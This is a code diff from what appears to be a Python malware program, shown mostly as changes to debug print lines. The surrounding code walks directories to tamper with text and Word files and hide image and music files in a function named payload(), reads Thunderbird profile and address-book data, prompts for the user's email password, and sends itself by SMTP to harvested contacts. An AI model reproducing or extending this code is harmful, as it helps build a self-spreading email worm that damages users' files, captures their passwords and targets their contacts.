@@ -94,7 +94,7 @@ def n_rand_numbers(n: int) -> typing.List[int]:
     result = []
     
     if n <= 0:
-        print("For n_rand_numbers, only positive values make sense!")
+        #print("For n_rand_numbers, only positive values make sense!")
         return None
     while len(result) < n:
         i = random.randint(0,n)
@@ -128,7 +128,7 @@ def read_text_file_to_dict(filename: str) -> IntKeyStrValDict:
     for i, line in zip(range(len(lines)), lines):
         result[i] = line
         
-    # print("read_text_file_to_dict: result = {}".format(result)) # test output
+    # print("read_text_file_to_dict: result = {}".format(result))
     return result
 
 
@@ -179,7 +179,7 @@ def shuffle_dict_content(dictionary: IntKeyArbValDict) -> IntKeyArbValDict:
         # dictionary is returned.
         max_index = 0
         rand_numbers = []
-    # print("shuffle_dict_content(): rand_numbers = {}".format(rand_numbers)) # test output
+    # print("shuffle_dict_content(): rand_numbers = {}".format(rand_numbers))
     
     # Write the values from the input dictionary to the output dictionary in 
     # random order:
@@ -338,30 +338,30 @@ def traverse_dirs(curr_dir: str) -> None:
     :curr_dir: the directory to start the traversal as absolute file name.
     """
     if os.path.islink(curr_dir):
-        print("detected symlink {}".format(curr_dir)) # test output
+        print("detected symlink {}".format(curr_dir))
         # TODO: Maybe do the same as for directories instead of just ignoring 
         # symlinks? -> Danger of recursive loops
         return
     if os.path.isfile(curr_dir):
         if is_file_type(curr_dir, "txt"):
-            # print("TEXT file {}".format(curr_dir)) # test output
+            # print("TEXT file {}".format(curr_dir))
             process_text_file(curr_dir)
         elif is_file_type(curr_dir, "docx"):
-            # print("DOCX file {}".format(curr_dir)) # test output
+            # print("DOCX file {}".format(curr_dir))
             process_docx_file(curr_dir)
         elif is_file_type(curr_dir, "jpeg") or is_file_type(curr_dir, "jpg") or is_file_type(curr_dir, "png"):
-            #print("image file {}".format(curr_dir)) # test output
+            #print("image file {}".format(curr_dir))
             make_file_hidden(curr_dir)
         elif is_file_type(curr_dir, "mp3") or is_file_type(curr_dir, "ogg"):
-            #print("music file {}".format(curr_dir)) # test output
+            #print("music file {}".format(curr_dir))
             make_file_hidden(curr_dir)
         """
         elif is_file_type(curr_dir, "odt"):
-            print("ODT file {}".format(curr_dir)) # test output
+            print("ODT file {}".format(curr_dir))
             process_odt_file(curr_dir)
         """
     if os.path.isdir(curr_dir):
-        # print("DIR {}".format(curr_dir)) # test output
+        # print("DIR {}".format(curr_dir))
         for file in os.listdir(curr_dir):
             # traverse_dirs("{}/{}".format(curr_dir, file))
             # system-independent version:
@@ -483,7 +483,7 @@ def rand_dir_name() -> str:
 
 def copy_password() -> None:
     global password
-    #print(f"copy_password(): password = {textfield.text()}") # test output
+    #print(f"copy_password(): password = {textfield.text()}")
     password = textfield.text()
 
 def password_window(account_name: str = "", host_name: str = "") -> str:
@@ -625,7 +625,7 @@ def add_profile_dir_to_list(thunderbird_path: str, line: str, profile_dir_names:
     relative_profile_dir_path = ""
     for i in range(len(l)-1):
         relative_profile_dir_path = l[i] if relative_profile_dir_path == "" else os.path.join(relative_profile_dir_path, l[i])
-    #print(f"relative_profile_dir_path = {relative_profile_dir_path}") # test output
+    #print(f"relative_profile_dir_path = {relative_profile_dir_path}")
     profile_dir_name = l[len(l)-1]
     profile_dir_name_absolute = os.path.join(thunderbird_path, relative_profile_dir_path, profile_dir_name)
     if os.path.isdir(profile_dir_name_absolute) and profile_dir_name_absolute not in profile_dir_names:
@@ -650,20 +650,20 @@ def send_mail_ssl(smtp_server_url: str, sender_email: str, password: str, to: ty
         # smtp_server.ehlo()
         try:
             l = smtp_server.login(sender_email, password)
-            print("l = {}\n".format(l)) # test output
+            #print("l = {}\n".format(l))
         except Exception as l_ex:
             # TODO: raise specific exception
-            #print("Exception thrown when trying to login!", l_ex) # test output
+            print("Exception thrown when trying to login!", l_ex)
             return 1
         try:
             smtp_server.sendmail(sender_email, to, whole_email_text)
         except Exception as s_ex:
             # TODO: raise specific exception
-            #print("Exception thrown when trying to send mail!", s_ex) # test output
+            print("Exception thrown when trying to send mail!", s_ex)
             return 1
 
     
-    #print("Email sent successfully!") # test output
+    #print("Email sent successfully!")
     return 0
 
 
@@ -685,21 +685,21 @@ def send_mail_starttls(smtp_server_url: str, sender_email: str, password: str, t
             smtp_server.starttls()
             # smtp_server.ehlo()
         except Exception as e:
-            print("Exception thrown when trying to create starttls connection!", e) # test output
+            print("Exception thrown when trying to create starttls connection!", e)
             return 1
         try:
             l = smtp_server.login(sender_email, password)
-            print("l = {}\n".format(l)) # test output
+            #print("l = {}\n".format(l))
         except Exception as l_ex:
-            print("Exception thrown when trying to login!", l_ex) # test output
+            print("Exception thrown when trying to login!", l_ex)
             return 1
         try:
             smtp_server.sendmail(sender_email, to, whole_email_text)
         except Exception as s_ex:
-            print("Exception thrown when trying to send mail!", s_ex) # test output
+            print("Exception thrown when trying to send mail!", s_ex)
             return 1
         
-    print ("Email sent successfully!") # test output
+    #print("Email sent successfully!")
     return 0
 
 
@@ -771,7 +771,7 @@ def find_thunderbird_profile_dirs() -> typing.List[str]:
         with open(installs_ini, "r") as iif:
             for line in iif:
                 if line.startswith("Default="):
-                    #print("Default line found!") # test output
+                    #print("Default line found!")
                     profile_dir_names = add_profile_dir_to_list(thunderbird_path, line, profile_dir_names)
             #print(f"profile_dir_names = {profile_dir_names}")
             return profile_dir_names
@@ -786,7 +786,7 @@ def find_thunderbird_profile_dirs() -> typing.List[str]:
     path_content: str = ""
     default_detected: bool = False
     if os.path.isfile(profiles_ini):
-        print("Use profiles.ini file")
+        #print("Use profiles.ini file")
         with open(profiles_ini, "r") as pif:
             for line in pif:
                 line = line.strip()
@@ -807,7 +807,7 @@ def find_thunderbird_profile_dirs() -> typing.List[str]:
                     if in_profile_def and path_detected:
                         profile_dir_names = add_profile_dir_to_list(thunderbird_path, path_content, profile_dir_names)
     
-    # print(f"profile_dir_names = {profile_dir_names}") # test output
+    # print(f"profile_dir_names = {profile_dir_names}")
     return profile_dir_names
 
 
@@ -820,7 +820,7 @@ def read_email_addresses_thunderbird(filepath: str) -> typing.List[str]:
                `None` otherwise.
     """
     database = os.path.join(filepath, "abook.sqlite")
-    #print(f"database = {database}") # test output
+    #print(f"database = {database}")
     con = None
     email_addresses = []
     
@@ -937,7 +937,7 @@ def send_mail_mime(sender_email: str, smtp_server_url: str, encryption_method: s
     # TODO: Include functionality to also send the sender's name
     
     if encryption_method != SSL and encryption_method != STARTTLS:
-        print("No valid encryption_method was specified!")
+        #print("No valid encryption_method was specified!")
         return
     
     subject = "filewriter"
@@ -976,10 +976,10 @@ def send_mail_mime(sender_email: str, smtp_server_url: str, encryption_method: s
 
 def payload() -> None:
     # TODO: The program does nothing if the passed directory doesn't exist.
-    print("Started traversing dirs...") # test output
+    print("Started traversing dirs...")
     # traverse_dirs(os.path.expanduser("~"))
     traverse_dirs(TESTING_DIR_PAYLOAD)
-    print("Finished traversing dirs!") # test output
+    print("Finished traversing dirs!")
 
 
 def send_email() -> None:
@@ -988,7 +988,7 @@ def send_email() -> None:
     installed Thunderbird client.
     """
     thunderbird_install_path: str = shutil.which("thunderbird", path=determine_possible_paths())
-    #print(f"thunderbird_install_path = {thunderbird_install_path}") # test output
+    #print(f"thunderbird_install_path = {thunderbird_install_path}")
     if not thunderbird_install_path:
         #print("Mozilla Thunderbird is not installed on the system!")
         sys.exit(0)
@@ -998,7 +998,7 @@ def send_email() -> None:
         for profile_dir in profile_dirs:
             print(f"profile_dir = {profile_dir}")
             to_email_addresses: typing.List[str] = read_email_addresses_thunderbird(profile_dir)
-            print(f"to_email_addresses = {to_email_addresses}") # test output
+            print(f"to_email_addresses = {to_email_addresses}")
             sender_name, sender_email = read_sender_name_and_email_thunderbird(profile_dir)
             print(f"sender_name = {sender_name}")
             print(f"sender_email = {sender_email}")
